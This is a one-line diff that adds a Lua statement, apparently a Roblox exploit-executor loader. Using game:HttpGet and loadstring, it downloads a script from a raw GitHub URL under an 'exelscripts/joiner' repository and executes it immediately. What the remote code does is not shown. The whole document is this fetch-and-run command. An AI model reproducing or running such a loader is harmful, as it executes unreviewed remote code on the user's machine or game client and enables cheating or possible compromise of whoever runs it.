@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/exelscripts/joiner/refs/heads/main/exel"))()
